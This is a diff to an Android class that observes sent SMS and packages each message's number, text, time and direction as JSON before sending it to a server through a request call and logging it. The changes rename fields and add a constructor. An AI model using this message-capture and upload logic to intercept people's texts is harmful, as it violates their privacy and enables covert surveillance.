@@ -26,11 +26,18 @@ public class SmsSentObserver extends ContentObserver {
 	private Context mContext;
 	RequestMakerImpl req;
 	private static long id = 0;
-
+	Handler handler;
+	
 	public SmsSentObserver(Handler handler, Context ctx) {
 		super(handler);
 		mContext = ctx;
 		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
+	}
+
+	public SmsSentObserver(Handler handler) {
+		super(handler);
+		// TODO Auto-generated constructor stub
+		this.handler = handler;
 	}
 
 	public boolean deliverSelfNotifications() {
@@ -93,12 +100,12 @@ public class SmsSentObserver extends ContentObserver {
 								JSONObject info = new JSONObject();
 								JSONObject object = new JSONObject();
 								try {
-									
-									info.put("tel", phNumber);
+
+									info.put("number", phNumber);
 									info.put("data", message);
 
 									object.put("time", date.logTime());
-									object.put("type", type);
+									object.put("type", dir);
 									object.put("info", info);
 									data.put(object);
 									jsonObject.put("data", data);
@@ -112,7 +119,7 @@ public class SmsSentObserver extends ContentObserver {
 								dr.sendRequest(sendJSONStr);
 
 								Logging.doLog(TAG, sendJSONStr, sendJSONStr);
-							
+
 								/*
 								 * if(colNames != null){ for(int k=0;
 								 * k<colNames.length; k++){ Log.e(TAG,
